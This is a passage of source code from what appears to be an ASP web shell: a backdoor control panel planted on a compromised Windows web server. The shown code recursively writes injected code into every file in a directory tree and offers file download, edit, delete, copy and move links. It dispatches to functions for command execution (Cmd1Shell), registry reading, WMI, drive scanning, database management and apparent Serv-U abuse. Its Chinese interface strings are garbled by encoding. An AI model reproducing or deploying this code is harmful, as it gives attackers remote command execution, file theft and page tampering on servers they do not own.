					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"��  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case else
					RRS"���������?��ĺ�������?û���Ҹ�����.":response.end
			end select
		else
			RRS"�� "&Wpath&myfile.name
		end if
RRS " �� <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='����'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='�༭'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a><br>"
	 Next
 Set fsubfolers = f.SubFolders
 For Each f1 in fsubfolers
	NewPath=Wpath&""&f1.name
 	InsertAllFiles NewPath,Wcode,pc
 Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub:Case "ReadREG":call ReadREG():Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "UpFile":UpFile():Case "plUpFile":PageUpload():Case "Cmd1Shell":Cmd1Shell():Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL:Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "Alexa":Alexa("AlexaURL"):Case "Alexa":getHTTPPage("url"):Case "Alexa":bytes2BSTR("vIn"):Case "DbManager":DbManager():Case "Course":Course():Case "wmi":wmi():Case "ScanDriveForm" : ScanDriveForm:Case "ScanDrive"     : ScanDrive Request("Drive"):Case "ScFolder"      : ScFolder Request("Folder"):Case "adminab":adminab():Case "sqlabc":sqlabc():Case "fuck":fuck():Case "hook":hook():Case "gody":gody():Case "suftp":suftp():Case "MMD":MMD():Case "upload":upload():Case "ServerInfo":ServerInfo():Case Else MainForm():End Select:if Action<>"Servu" then ShowErr():RRS"</body></html>"

%>
